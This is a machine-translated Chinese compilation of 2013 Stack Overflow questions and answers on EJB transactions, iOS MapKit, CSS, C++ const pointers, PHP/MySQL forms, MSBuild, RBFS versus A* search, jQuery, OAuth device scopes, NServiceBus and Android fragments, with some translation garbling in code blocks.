> 赞同：0
> 
> 时间：2013-04-18T19:47:10.360
> 
> 标签：jakarta-ee, transactions, ejb

我有以下示例：

```
public class MyEJBService implements javax.ejb.SessionBean {
      public void modifyAllItems() {
           doSomething...
           for(...)
           {
                modifyItem(item);
           }
      }

     public void modifyItem(Item item) {
          doSomething...
     }
} 
```

方法 1 = modifyAllItems 方法 2 = modifyItem

Method1 多次调用 method2。我想在method1禁用事务，但在method2启用事务。method2 的每次调用都应该在不同的事务中（如果在修改项目时发生错误，则可能已修改某些项目而其他项目保持不变）。我已经为 method1() 定义了一个 EJB 事务类型——从不，另一个为 method2()——需要新的。问题是，当我调用 method2() 时，EJB 似乎没有创建任何事务，因为当 method2() 内部发生错误时它不会回滚（如果在 method2 内部的数据库中发生了某些更改但它抛出在方法 2 完成之前出现异常，数据库没有返回到以前的状态 - 回滚）。这种行为是预期的吗？我有点困惑。非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T06:49:06.473

是的，这是预期的行为，因为事务是使用代理实现的，因此仅在从第三方对象完成对 EJB 方法的调用时才应用。如果您希望在从 method1() 调用时应用 method2() 事务，则必须将其移动到第二个 EJB 对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T23:57:02.430

另一个想法是 Bean Managed Transaction，以下是步骤

1.  ejb-jar.xml

    <transaction-type>Bean</transaction-type>

2.  编码

    公共类 MyEJBService 实现 javax.ejb.SessionBean {
    SessionContext 上下文；

    ```
    public void modifyAllItems() 
    {
        doSomething();
         for(...)
         {
             UserTransaction  trans=context.getUserTransaction();;
             try
             {
              trans.begin();
              modifyItem(item);
              trans.commit();
             }catch(Exception  e)
             {
                 trans.rollback();//if need propagation then:trans.setRollbackOnly();
             }
         }
    }

    public void modifyItem(Item item) {
        doSomething();
    }

    @Override
    public void setSessionContext(SessionContext context) throws EJBException,
            RemoteException {
        this.context = context;
    } 
    ```

# ios - MKMapView 区域属性返回错误结构

> ID：16091790
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:25.330
> 
> 标签：ios, objective-c, mkmapview, mapkit, cllocation

我正在使用 MKMapKit 并将该区域设置为全尺寸的美国，并且它按预期显示。但是，在检查该`self.mapView.region`属性时，我得到了一些奇怪的结果，这些结果会影响我稍后在程序中的计算。

这是我设置地图视图的方式：

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    MKCoordinateRegion usa = MKCoordinateRegionMake(CLLocationCoordinate2DMake(39.4, -91.5), MKCoordinateSpanMake(40, 40));
    self.mapView = [[MKMapView alloc] initWithFrame:self.view.bounds];
    [self.view addSubview:self.mapView];
    self.mapView.region = usa;
    self.mapView.delegate = self;
    self.mapView.showsUserLocation = YES;
    [self.mapView.userLocation addObserver:self forKeyPath:@"location" options:0 context:nil];
} 
```

这是美国`MKCoordinateRegion`，看起来不错并且可以工作：

```
(lldb) p usa
(MKCoordinateRegion) $0 = {
  (CLLocationCoordinate2D) center = {
    (CLLocationDegrees) latitude = 39.4
    (CLLocationDegrees) longitude = -91.5
  }
  (MKCoordinateSpan) span = {
    (CLLocationDegrees) latitudeDelta = 40
    (CLLocationDegrees) longitudeDelta = 40
  }
} 
```

然后我设置区域`self.mapView.region = usa;`并在它之后中断，这现在是`self.mapView.region`.

```
(lldb) p [self.mapView region]
(MKCoordinateRegion) $1 = {
  (CLLocationCoordinate2D) center = {
    (CLLocationDegrees) latitude = 39.4
    (CLLocationDegrees) longitude = 39.4
    (CLLocationDegrees) latitudeDelta = 39.4
    (CLLocationDegrees) longitudeDelta = -91.5
  }
  (MKCoordinateSpan) span = {
    (CLLocationDegrees) latitude = 66.4999527377778
    (CLLocationDegrees) longitude = 66.4999527377778
    (CLLocationDegrees) latitudeDelta = 66.4999527377778
    (CLLocationDegrees) longitudeDelta = 67.4999957172512
  }
  (CLLocationCoordinate2D) center = {}
} 
```

所以问题是中心结构是错误的，经度是关闭的，`CLLocationCoordinate2D`甚至不应该有增量字段，它看起来像一个`MKCoordinateSpan`.

CLLocationCoordinate2D 定义：

`typedef struct { CLLocationDegrees latitude; CLLocationDegrees longitude; } CLLocationCoordinate2D;`

所以知道我哪里出错了吗？我错过了一些非常明显的东西吗？如果这是错误的方法，我怎样才能获得真实数据以便稍后在应用程序中进行一些计算？

使用 xcode 4.6.1 和 iOS 6.1 模拟器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T14:37:37.630

我认为这只是一个 lldv 错误或我的 lldb 使用中的错误。如果我 NSLog 纬度/经度一切都很好。

# html - CSS按钮悬停背景样式子

> ID：16091791
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:30.277
> 
> 标签：html, css, image, button, background

当有人将鼠标悬停在其中包含 img 元素的按钮上时，它应该具有红色背景色。

```
<button class="btn-img">
    <img src="http://upload.wikimedia.org/wikipedia/en/thumb/2/2a/Burj_Al_Arab,_Dubai,_by_Joi_Ito_Dec2007.jpg/220px-Burj_Al_Arab,_Dubai,_by_Joi_Ito_Dec2007.jpg" alt="Dubai" />
</button>

.btn-img {
    display: block;
    width: 160px;
    height: 120px;
    margin: 0;
    padding: 0;
    border: 0;
    cursor: pointer;
}

.btn-img:hover {
    background-color: red;
}

.btn-img:hover img {
    background-color: blue;
} 
```

[http://jsfiddle.net/28QEM/](http://jsfiddle.net/28QEM/)

这可能吗？是不是因为button元素的原因，因为如果一个div里面的child有背景色，而父背景色改变了，基本上就覆盖了children的背景色。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:43:42.300

这是获得所需效果的一种可能方法：

```
<button class="btn-img">
    <div class="img-wrap">
    <img src="image_name.jpg" />
    </div>
</button> 
```

和 CSS 可能看起来像：

```
.btn-img {
    display: block;
    margin: 0;
    padding: 0;
    border: 0;
    cursor: pointer;
    background-color: white;
    outline: 1px dotted blue;
}
.btn-img .img-wrap {
    margin: 10px;
}

.btn-img img {
    display: block;
}

.btn-img:hover .img-wrap {
    background-color: black;
}

.btn-img:hover img {
    opacity: 0.8;
} 
```

**这个怎么运作**

用另一个包裹你的图像，`<div>`这样你就可以更准确地控制边距和填充，并给你一个钩子来控制图像后面的背景颜色，而不会使颜色溢出图像本身。

触发时`.btn-img:hover`，将背景颜色更改`div.img-wrap`为黑色，并将图像的不透明度更改为 0.8。这具有使图像变暗的效果。

您可以通过为图像环绕元素尝试不同的背景颜色和不透明度来试验效果。

我认为这可能适用于 IE7，但请尝试一下。

小提琴：http: [//jsfiddle.net/audetwebdesign/8QMTv/](http://jsfiddle.net/audetwebdesign/8QMTv/)

**顺便说一下...**

如果您使用链接包装图像以使用某种 JavaScript 类型的缩放视图效果（例如 highslider），您可以`<div class="img-wrap">`用一个简单的`<a>`标签替换并设置其`display: block`.

**记住...**

浏览器的样式往往`<button>`与其他内联元素（如）不同`<span>`，因此边距和填充等属性的行为可能与您预期的有所不同。

# c++ - 更改常量指针的地址

> ID：16091793
> 
> 赞同：2
> 
> 时间：2013-04-18T19:47:34.940
> 
> 标签：c++

我试图理解一件事。

我知道我不能改变常量指针的值，但我可以改变它的地址，如果我用以下方式初始化一个指针：

```
int foo = 3;
const int *ptr = &foo;
*ptr = 6; // throws an error
int bar = 0;
ptr = &bar; // foo == 0 
```

现在，假设我声明（/define，我不记得是哪一个）一个函数：

```
void change(const int arr[], int size);

int main() {
   int foo[2] = {};
   change(foo, 2);
   std::cout << foo[0];
}

void change(const int arr[], int size) {
   // arr[0] = 5 - throws an error
   int bar = 5;
   arr = &bar;
} 
```

上面代码的最后一行不会引发任何错误。但是，当函数结束并且我显示第一个元素时，它显示 0 - 所以没有任何改变。

为什么呢？

在这两种情况下，我都有常量指针，我尝试更改它的地址。在第一个示例中它有效。在第二个中它没有。

* * *

我还有一个问题。有人告诉我，如果我想将两指针类型传递给函数， const 关键字将无法按预期工作。真的吗？如果是这样，那是什么原因呢？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-18T19:59:10.810

你把术语搞砸了，所以我要从那里开始，因为我认为这是你困惑的主要原因。考虑：

```
int x;
int* p = &x; 
```

`x`是一个`int`并且`p`是一个“指向”的指针`int`。*修改值`p`*意味着改变`p`自身指向其他地方。指针值是它保存的地址。该指针`p`保存`int`对象的地址。改变指针的值并不意味着改变`int`对象。例如，`p = 0;`将修改`p`的值。

除此之外，*地址`p`*不是它持有的地址。如果你这样做了，地址`p`将是你得到`&p`的，并且是“指向指针的指针`int`”类型。也就是说，地址`p`是您可以`p`在内存中找到指针的位置。由于对象不会在内存中移动，因此不存在“更改其地址”之类的事情。

所以现在已经不碍事了，让我们了解什么是常量指针。`const int*`不是一个*常量*指针。它是一个指向常量对象的指针。它指向的对象是常量，而不是指针本身。常量指针类型看起来更像`int* const`. 这里`const`适用于指针，所以它是“指向的`const`指针`int`”类型。

好的，现在我将快速给你一个简单的方法来记住声明和定义之间的区别。如果你买了一本字典，里面只有一个单词列表，你真的会称它为字典吗？不，字典应该充满单词的定义。它应该告诉你这些词是什么意思。没有定义的字典只是声明这样的词存在于给定的语言中。因此，声明表明某物存在，而定义则给出了它的含义。在你的情况下：

```
// Declaration
void change(const int arr[], int size);

// Definition
void change(const int arr[], int size) {
   // arr[0] = 5 - throws an error
   int bar = 5;
   arr = &bar;
} 
```

现在在这里解释这个问题。没有数组参数类型这样的东西。任何数组类型参数都将转换为指针。所以声明`change`实际上等同于：

```
void change(const int arr*, int size); 
```

当你这样做时，`arr = &bar;`你只是将地址分配给`bar`指针`arr`。这对`arr`指向的数组元素没有影响。为什么要呢？您只是在更改`arr`指向的位置，而不是它指向的对象。事实上你不能改变它指向的对象，因为它们是`const` `int`s。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-18T19:53:41.933

> 我知道我不能改变常量指针的值，但我可以改变它的地址

不。你不能改变任何东西的地址。你的意思是你不能改变它指向的对象，但你可以改变指针本身？因为这就是事实——**在指向 const 类型的情况下。**但是，如果你有一个指向非 const 对象的 const 指针，那么你不能改变指针，你只能改变它指向的任何东西。

附录（编辑）：一个方便的经验法则是`const`适用于左侧的东西，除非左侧没有任何东西，因为它适用于右侧的类型。例子：

```
const int *ptr;
int const *ptr; // these two are equivalent: non-const pointer to const int

int *const ptr; // const pointer to non-const int

int const *const ptr; // const pointer to const int
const int *const ptr; // same as above 
```

> 但是，当函数结束并且我显示第一个元素时，它显示 0 - 所以没有任何改变。

范围。`arr`是一个函数参数 - 所以它是函数的本地参数。无论你用它做什么，它在函数之外都不会有效。要实现您想要的，请将其声明为参考：

```
void change(const int *&arr, int size) 
```

> 有人告诉我，如果我想将两指针类型传递给函数， const 关键字将无法按预期工作。真的吗？

这取决于你的期望是什么。如果您仔细阅读标准并有适当的期望，那么它确实会按预期工作。例子：

```
const int **ptr; // pointer to pointer to const int
int const **ptr; // same as above
const int *const *ptr; // pointer to const pointer to const int 
```

[等等。您可以使用CDecl](http://cdecl.org)生成更多这些时髦的声明

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T20:00:06.220

首先是使用正确的术语，这实际上有助于理解：

```
const int *ptr = &foo; 
```

*那是指向常量整数*的指针，而不是指向整数的*常量指针*。您无法更改指向的对象，但可以更改指针以引用不同的对象。

```
void change(const int arr[], int size); 
```

该签名由编译器处理为`void change( const int *arr, int size )`，我建议您将其键入，因为它会减少混淆。在调用函数的地方`change(foo,2)`，编译器将转换具有类型的参数`foo`（类型为`int[2]`）（这两种转换通常称为数组*衰减*到指针）。`&foo[0]``const int*`

 *现在就像在第一个代码块中一样，您无法更改指向的内存，但您可以更改指针以引用不同的对象。

此外，在 C++ 中，默认模式是按值传递。`arr`里面的指针`change`是value的*副本*`&foo[0]`。在函数内部，您正在更改该副本，但这不会影响函数上下文之外的任何内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:56:30.200

`const int *`是在做它应该做的事情，让你困惑的是它的目的。

将其视为指向只读 int 的指针。你可以指向任何你想要的 int，但无论如何它都是只读的。

例如，您可以使用它来遍历类型数组`const int`。*

# php - 带有提交按钮的复选框表单不会从数据库 php html sql 中回显值

> ID：16091794
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:39.223
> 
> 标签：php, html, mysql, database

我是 php、html 和 mysql 的新手。我有一个数据库，其中包含他们想要出售产品的用户名、产品和价格。该代码用于带有提交按钮的复选框表单，该按钮的作用类似于价格过滤器，提交时应该回显与相应复选框匹配的用户名、产品和价格。. 如果用户选择标记为“0-25”或“100 及以上”的复选框，并单击提交按钮，它应该会回显拥有该特定价格范围内商品的所有用户。我在网上看过并试图操纵一些接近我所拥有的东西。有人可以帮助我或让我了解如何做到这一点吗？任何帮助表示赞赏

这是我的复选框表单。

```
<form action="pricefilter.php" method="post">
    <br><b>Filter By Price:</b><br><br> 
    <input type="checkbox" name="$0-$25[]" id="Price" value="0-25"/>&nbsp;$0-$25<br><br>
    <input type="checkbox" name="$25-$50[]" id="Price" value="25-50"/>&nbsp;$25-$50<br><br>
    <input type="checkbox" name="$50-$100[]" id="Price" value="50-100"/>&nbsp;$50-$100<br><br>
    <input type="submit" name="submit" value="Submit" />
</form> 
```

这是我的 php 文件的代码。

```
<?php
mysql_connect ("localhost", "root","root")  or die (mysql_error());
mysql_select_db ("xuswapuser");

$priceFilter = $_GET['priceFilter'];

 $filteredResponse = array ();
foreach($priceFilter as $range)
{
if($range == 025)
    {
        $query = "select * from Books where Price <= 25";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);

    }

    if($range == 2550)
    {
        $query = "select * from Books where Price >= 25 AND Price <=50";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }
     if($range == 5075)
    {
        $query = "select * from Books where Price >= 50 AND Price <=75";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }

     if($range == 75100)
    {
        $query = "select * from Books where Price >= 75 AND Price <=100";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }
     if($range == 100)
    {
        $query = "select * from Books where Price >= 100";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }

}

?>

 <html>
   <head>
   <title> 
XUSWAP 
</title>
<script type="text/javascript" src="sorttable.js"></script>
</head>
<body style="margin: 0; padding: 0;">
       <div id="header" style="background-color:#339900;height:157px;width:100%;position:relative;">                                      <!--header area-->
            <form id="headerForm" name="headerForm" method="Post" action="" align="right">
                  <input type="image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSN3XIAe50cjq5Cf91GbAywPkChmI5HOAqYxgmRN8F5OhW7I_RT5Q" alt="Placeholder" align="left" width="150" height="150">
                  <br><br><br>
                  <input type="text" name="searchInput"id="search" style="width:500px;"/>
                  <input type="submit" name="searchButton" id="searchButton" value="Search" />
                  <input type="submit" name="logoutButton" id="logoutButton" value="Logout"/>
                  <br><br><br>

            </form>
       </div> 
       <div id="background" style="background-color:#FFD700;height:100%; width:100%;"> 
 <div id = "pageContent"></div>
 <div id="background" style="background-color:#FFD700;height:100%; width:100%;"> 
<blockquote>
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <blockquote>
                <p>Books </p>
              </blockquote>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </blockquote>
        <blockquote>

                                <table class="sortable" width="940" height="52" border="0">
                                <tr>
                                  <td width="200" id="sortable">Username</td>
                                  <td width="253"> Product</td>
                                  <td width="220">Condition</td>
                                  <td width="249">Price</td>
                                </tr>
                                <?php do { ?>
                                  <tr>
                                    <td><?php echo $range['id']; ?></td>
                                    <td><?php echo $range['Product']; ?></td>
                                    <td><?php echo $range['Condition']; ?></td>
                                    <td><?php echo $range['Price']; ?></td>
                                  </tr>
                                  <?php } while ($range = mysql_fetch_assoc($sql)); ?>
                              </table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:52:35.147

哎哟。:)

1.  IsChecked() 函数有什么作用？它是否已定义，或者您想要 isset() ？
2.  不要使用 $ 美元符号命名您的字段。
3.  不要将它们设为数组，如果不是，则您正在使用该组一次，因此它后面不应有 []
4.  要访问发布的名称字段，您需要 $_POST 超全局，您不能直接通过其名称访问它：

-

```
 <input name="asd"> 
```

如果在 PHP 中发布，将被访问，例如：

```
$_POST['asd'] 
```

并检查它是否已发布：

```
if(isset($_POST['asd']) { ... 
```

通过使用 $row[] 数组的约定，我假设您要打印查询结果。为了打印结果，您需要获取它们并遍历它们。以您的方式，它将是：

```
 while ($row = mysql_fetch_assoc($sql)) { ... 
```

但是 mysql_* 函数已被弃用，在您习惯它们之前，最好切换到 mysqli_* 或 PDO 库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:11:49.187

这只是供您遵循的简单代码，您可以通过将检查的值放入数组并通过 foreach() 执行查询来循环所有可能性

```
<input type="checkbox" name="priceFilter[]" value="025">
<input type="checkbox" name="priceFilter[]" value="2550">
// etc.

<?php
  $priceFilter = $_POST['pricFilter']; // this is now an array

  if(isset($priceFilter[025]))
  {
      $query25 = "select * from Books where Price <= 25";
  }
  if(isset($priceFilter[2550]))
  {
      $query2550 = "select * from Books where Price >= 25 AND Price <= 50";
  }
  //etc.

  // then run your query if it is set

  if(isset($query25))
  {
      $sql = mysql_query($query25);
  }

  // then do w/e you need to do then run subsequent possibily
?> 
```

这很耗时，但我只是想向您说明如何处理 php 中的复选框

如果您想使用 foreach 进行更新，请更新：

```
<?php
$priceFilter = $_GET['priceFilter'];
$filteredResponse = array ();
foreach($priceFilter as $range)
{
if($range == 025)
    {
        $query = "select * from Books where Price <= 25";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }

    if($range == 2550)
    {
        $query = "select * from Books where Price >= 25 AND Price <=50";
        $sql = mysql_query($query);

        array_push($filteredResponse, $sql);
    }

    // do this for all the conditions and you can save the results in an array of arrays
} 
```

您现在有了一个基于复选框表单选择的 MYSQL 响应数组。然后只需解析您认为合适的信息。

我还建议 - 在继续使用 PDO 而不是 mysql_ 之前，因为它是遗留代码

[看看这个 PDO 使用](https://stackoverflow.com/questions/16089291/inserting-form-array-data-into-mysql-with-php/16089599#16089599)

# msbuild - 如何以编程方式获取 $(OutDir)？

> ID：16091796
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:46.447
> 
> 标签：msbuild, msbuild-task

我正在编写一个自定义构建任务，并希望以编程方式访问此属性的值。有可能的？我查看了 Task 类的所有成员，没有看到任何看起来可以让我获得价值的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:48:39.107

如果自定义任务在没有属性的情况下无法运行，最佳做法是将该属性作为必需的输入：

```
[Required]
public string OutDir { get; set; } 
```

通过设置：

```
<MyTask ... OutDir="$(OutDir)" /> 
```

# search - 性能差异 RBFS - A*

> ID：16091797
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:53.540
> 
> 标签：search, a-star

我已经实现了 AIMA 中定义的 RBFS，并希望将其与 A* 的实现进行比较。当我在 TSPlib（ulyssis16 - 16 个城市）的实例上试用它时，两者都提出了正确的解决方案，内存使用也是正确的（A* 为指数，RBFS 为线性）。唯一奇怪的是，RBFS 算法在不应该的情况下比 A* 快得多。A* 大约在 3.5 分钟内完成，RBFS 只需几秒钟。当我计算每个节点的访问次数时，A* 访问的节点比 RBFS 多得多。这似乎也违反直觉。

这是因为微不足道的例子吗？我不能在更大的实例上尝试它，因为我的计算机没有足够的内存。

有没有人有任何建议？根据它们的规范、结果和内存使用情况，这两种算法似乎都是正确的。只有执行时间似乎关闭了......

我已经到处找了，但找不到任何关于他们的搜索策略有什么不同的地方。除了 RBFS 可以重新访问节点这一事实。

谢谢

碧玉

编辑 1：AIMA 对应于 Russel 和 Norvig 的《Artificial Intelligence a Modern Approach》一书。编辑 2：TSPlib 是 TSP 问题的一组实例（[http://comopt.ifi.uni-heidelberg.de/software/TSPLIB95/](http://comopt.ifi.uni-heidelberg.de/software/TSPLIB95/)) 编辑 4：A* 算法的代码如下。这应该是正确的。def graph_search(problem, fringe): """搜索一个问题的后继者以找到一个目标。参数边缘应该是一个空队列。如果两条路径达到一个状态，只使用最好的一个。[图 3.18] """ closed = {} fringe.append(Node(problem.initial)) while fringe: node = fringe.pop() if problem.goal_test(node.state): 如果 node.state 不在关闭状态，则返回节点：已关闭 [ node.state] = True fringe.extend(node.expand(problem)) return None

```
def best_first_graph_search(problem, f):
    return graph_search(problem, PriorityQueue(f,min))

def astar_graph_search(problem, h):
    def f(n):
        return n.path_cost + h(n)
    return best_first_graph_search(problem, f) 
```

其中问题是一个变量，包含有关要解决的问题的详细信息（达到目标时，如何生成后继者，初始状态......）。一个节点包含如何通过存储父节点和一些其他效用函数来达到该状态的路径。这是此代码的旧版本[http://aima-python.googlecode.com/svn/trunk/search.py](http://aima-python.googlecode.com/svn/trunk/search.py)​​ ）对于 TSP 问题，旅游是增量创建的。使用的启发式是尚未访问的节点上的最小生成树。

RBFS的代码如下： def rbfs(problem, h): def f(n): return n.path_cost + h(n)

```
 def rbfs_helper(node, bound):
        #print("Current bound: ", bound)

        problem.visit(node)

        if (problem.goal_test(node.state)):
            return [node, f(node)]

        backup = {}
        backup[node.state.id] = f(node)

        succ = list(node.expand(problem))

        if (not succ):
            return [None, float("inf")]

        for v in succ:
            backup[v.state.id] = max(f(v), backup[node.state.id])

        while(True):
            sortedSucc = sorted(succ, key=lambda node: backup[node.state.id])

            best = sortedSucc[0]

            if (backup[best.state.id] > bound):
                return [None, backup[best.state.id]]

            if (len(sortedSucc) == 1):
                [resultNode, backup[best.state.id]] = rbfs_helper(best, bound)
            else:
                alternative = sortedSucc[1]
                [resultNode, backup[best.state.id]] = rbfs_helper(best, min(bound, backup[alternative.state.id]))

            if (resultNode != None):
                return [resultNode, backup[best.state.id]]

    [node, v] = rbfs_helper(Node(problem.initial), float("inf"))

    return node 
```

它还使用上面定义的问题和节点。这些是专门设计用作通用元素的。

# javascript - CSS：nth- child（偶数）选择器背景颜色不起作用

> ID：16091798
> 
> 赞同：0
> 
> 时间：2013-04-18T19:47:53.860
> 
> 标签：javascript, html, css, css-selectors

我试图在两行上均匀地显示背景颜色`:nth-child(even)`，但它不起作用，但它在 jsfiddle.net 上工作（没有 javascript 来生成表格）。

调用 JSON 文件后生成表 -

```
$(document).ready(function() {
    $.getJSON("js/dataPokerPlayers.json", function(data) {
        $.each(data, function(i, data){
            $(".tableData tbody").append("<tr><td class=\"centertext\">" + data.rank + "</td><td>" + data.name + "</td><td class=\"centertext\">" + data.earnings + "</td><td class=\"centertext\">" + data.points + "</td><td class=\"centertext\">" + data.totalearnings + "</td></tr>");
        });
    });
}); 
```

CSS

```
.tableData tbody tr:nth-child(even) {
    background-color:#212121;
} 
```

HTML

```
<table class="tableData">
    <thead>
        <tr>
        <th>Rank</th>
        <th width="250">Name</th>
        <th>Earnings</th>
        <th>Points</th>
        <th>Total Earnings</th>
        </tr>
    </thead>
    <tbody></tbody>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-22T04:56:20.623

以下 CSS 代码将起作用。

```
.tableData > tbody > tr:nth-child(2n) {
background-color:#212121;} 
```

# javascript - 将一个html字符串拆分为字符串数组，按顶级标签拆分

> ID：16091803
> 
> 赞同：0
> 
> 时间：2013-04-18T19:48:25.027
> 
> 标签：javascript, html, regex

说我有

```
var string = 
"<h1>Header</h1>
<p>this is a small paragraph</p>
<ul>
    <li>list element 1.</li>
    <li>list element 2.</li>
    <li>list element 3\. With a small update.</li>
</ul>"
//newlines for clarity only 
```

如何使用 javascript 拆分此字符串以便得到

```
var array = string.split(/*...something here*/)

array = [
"<h1>Header</h1>",
"<p>this is a small paragraph</p>",
"<ul><li>list element 1.</li><li>list element 2.</li><li>list element 3\. With a small update.</li></ul>"
] 
```

我只想拆分顶部的 html 元素，而不是子元素。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:52:31.763

你可以这样做：

```
var string = '<div><p></p></div><h1></h1>';
var elements = $(string).map(function() {
    return $('<div>').append(this).html();  // Basically `.outerHTML()`
}); 
```

结果：

```
["<h1>Header</h1>", "<p>this is a small paragraph</p>", "<ul>    <li>list element 1.</li>    <li>list element 2.</li>    <li>list element 3\. With a small update.</li></ul>"] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-04-09T19:08:06.990

一个高性能的解决方案（[http://jsperf.com/spliting-html](http://jsperf.com/spliting-html)）：

```
var splitter = document.createElement('div'),
  text = splitter.innerHTML = "<h1>Header</h1>\
<p>this is a small paragraph</p>\
<ul>\
    <li>list element 1.</li>\
    <li>list element 2.</li>\
    <li>list element 3\. With a small update.</li>\
</ul>",
  parts = splitter.children,
  part = parts[0].innerHTML; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:56:36.397

你*不能**用正则表达式*来做到这一点。如果您有多个相同类型的嵌套元素，您的正则表达式将失败，例如

```
<div>
  <div>
    <div>
    </div>
  </div>
</div> 
```

这是因为正则表达式只能处理[正则语言](http://en.wikipedia.org/wiki/Regular_language)，而 HTML 是真正的[上下文无关语言](http://en.wikipedia.org/wiki/Context-free_language)（上下文无关比正则“更复杂”）。

另请参阅：[https ://stackoverflow.com/a/1732454/2170192](https://stackoverflow.com/a/1732454/2170192)

但是，如果您没有相同类型的嵌套元素，您可以通过以下正则表达式（使用反向链接）返回的所有匹配项来拆分您的 html 字符串：

```
/<(\w+).*<\/\1\s*>/igsm 
```

*   `<(\w+)`匹配小于号和几个单词字符（字母、数字、下划线），同时通过括号捕获单词字符（第一个捕获组）。
*   `.*`匹配元素的内容。
*   `<\/`匹配结束标签的开头。
*   `\1`是与通过第一个*捕获组捕获的符号序列完全匹配的**反向引用*。
**   `\s*>`匹配可选的空格和大于号。*   `igsm`是*修饰符*：不区分大小写、全局、点匹配所有符号和多行。*

# google-oauth - 为设备验证 Google Drive

> ID：16091806
> 
> 赞同：0
> 
> 时间：2013-04-18T19:48:28.090
> 
> 标签：google-oauth

我正在开发一个访问谷歌 API 的应用程序，并且我正在使用 OAuth 2.0 为设备工作日历和谷歌云打印 API。

几个月前，在 Google 论坛上，我询问了 Drive API 返回“invalid_scope”的问题，他们告诉我们，对于设备，他们正在限制范围，并希望尽快开放更多。

然后我们询问其他 API（如 Drive）何时可以向设备开放，因为我们有客户要求我们将其添加到我们的应用程序中。

希望谷歌的人能回答这个问题。谢谢！

要求：

```
POST /o/oauth2/device/code HTTP/1.0
Accept: text/html
Host: accounts.google.com
Content-type: application/x-www-form-urlencoded
Content-length: 92

client_id=xxxxxx&scope=https://www.googleapis.com/auth/drive 
```

回答：

```
{
  "error" : "invalid_scope"
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:25:57.487

是的，我们将重新打开设备流程以访问更多范围。我们仍在研究细节，但目标是在本季度晚些时候进行此更改。

# nservicebus - 许多工人的许多分销商

> ID：16091807
> 
> 赞同：2
> 
> 时间：2013-04-18T19:48:30.207
> 
> 标签：nservicebus, nservicebus3, nservicebus-distributor, nservicebus4

我们是使用 NServiceBus 作为联合系统中的消息传递框架的许可产品。

寻找在新功能中使用它的机会 - 有没有办法构建多站点系统（横向扩展），每个站点/节点在该系统中生成消息并将消息分发给位于多个节点/站点上的工作人员？每个分销商和工人都可以托管在自己的站点（同一个 LAN）上，并且每个站点都可以随时关闭。所有的经销商和工人应该是对称的。

起初，它看起来像是一个经典的“许多生产者对许多竞争消费者”的问题。但是我找不到使用 NServiceBus 实现它的内置方法，因为据我所见，每个工人只能将健康歌曲发送给一个分销商（我可能错了）。

我遇到的另一个问题是有一个集中的 RavenDB 实例来保存分发者订阅。将 RavenDB 放在它自己的“可用性组”中需要额外的资源。有没有办法在同一个站点下托管 RavenDB 实例，在每个站点使用它的本地数据库实例时复制它们的数据？这也会将分销商的 HA 绑定到他们的订阅数据库。

阅读此讨论- [http://tech.groups.yahoo.com/group/nservicebus/message/18412](http://tech.groups.yahoo.com/group/nservicebus/message/18412) 似乎 NServiceBus 需要一个集群来保持已发布数据的 HA。但是为什么分发者不能等待确认消息已被工作人员成功消费和处理，并继续重试将其发布给相同或不同的工作人员？这样，即使 VM 因队列中的数据而宕机，数据也会被发送到当时可用的另一个节点。

编辑：试图在 NServiceBus 官方雅虎组提出同样的问题，但在雅虎组中不断收到 pythonError。

在此先感谢 Rami Prilutsky，dbMotion

# android - 方向更改时的操作栏选项卡片段

> ID：16091810
> 
> 赞同：0
> 
> 时间：2013-04-18T19:48:38.043
> 
> 标签：android, android-fragments, android-actionbar

有没有办法完全删除与操作栏选项卡关联的片段？我的应用程序在纵向视图中有 2 个选项卡。在风景视图中，我加载了一个完全不同的片段视图。当我从纵向视图转到着陆时，选择的最后一个选项卡中的片段覆盖了风景中的片段。

有没有办法确保在方向更改时永远不会重新创建来自纵向视图的选项卡片段？

编辑：我正在使用动态片段。所有片段都被添加到同一个框架布局中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:15:09.287

当您更改方向时，您会重新创建活动，从而重新创建所有片段。根据主 Activity 的 onCreate 方法中的方向来处理这种情况应该很简单。

要获得方向使用：

```
getResources().getConfiguration().orientation 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T14:31:39.443

通过调用父片段管理器重新创建活动时，通过标签定位片段解决了该问题：

```
 Fragment frag = super.getSupportFragmentManager().findFragmentByTag("tag");
if (frag != null)
fragTransaction.remove(frag); 
```

# reporting-services - 对包含两个组的 SSRS 2012 报告进行分页

> ID：16091811
> 
> 赞同：0
> 
> 时间：2013-04-18T19:48:41.147
> 
> 标签：reporting-services, pagination, row-number

